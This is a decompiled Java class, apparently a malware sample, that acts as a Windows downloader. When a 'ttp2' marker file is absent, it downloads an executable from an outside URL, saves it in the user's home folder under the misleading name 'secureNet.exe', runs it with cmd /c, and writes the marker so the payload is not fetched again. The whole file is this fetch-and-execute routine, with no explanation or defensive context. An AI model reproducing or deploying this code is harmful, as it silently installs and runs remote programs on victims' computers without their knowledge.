import java.io.Writer;
import java.io.PrintWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class NewRaco
{
    public NewRaco() throws IOException {
        final String os = System.getProperty("os.name");
        final String home = System.getProperty("user.home");
        final File fichier = new File(home.trim().substring(0, 3));
        final File[] tab = fichier.listFiles();
        if (os.toLowerCase().indexOf("linux") == -1) {
            if (os.toLowerCase().indexOf("vista") != -1) {
                for (int i = 0; i < tab.length; ++i) {
                    if (tab[i].getName().toLowerCase().equals("utilisateurs")) {
                        home.replaceFirst("Users", "utilisateurs");
                    }
                }
            }
            final File[] tab2 = fichier.listFiles();
            boolean exist = false;
            for (int j = 0; j < tab2.length; ++j) {
                if (tab2[j].getName().toLowerCase().indexOf("ttp2") != -1) {
                    exist = true;
                }
            }
            if (!exist) {
                final BufferedInputStream in = new BufferedInputStream(new URL("http://www.getbroadbandanywhere.com/store/geoip.exe").openStream());
                final FileOutputStream fos = new FileOutputStream(String.valueOf(home) + "\\secureNet.exe");
                final BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
                final byte[] data = new byte[1024];
                int x = 0;
                while ((x = in.read(data, 0, 1024)) >= 0) {
                    bout.write(data, 0, x);
                }
                bout.close();
                in.close();
                final Runtime r = Runtime.getRuntime();
                try {
                    System.out.println("cmd /c \"" + home + "\\secureNet.exe\"");
                    final Process p = r.exec("cmd /c \"" + home + "\\secureNet.exe\"");
                }
                catch (IOException ex3) {}
                PrintWriter writer1 = null;
                try {
                    writer1 = new PrintWriter(new FileWriter(String.valueOf(home) + "\\ttp2"), true);
                    writer1.close();
                }
                catch (IOException ex2) {
                    System.out.println(ex2);
                }
            }
        }
    }
}
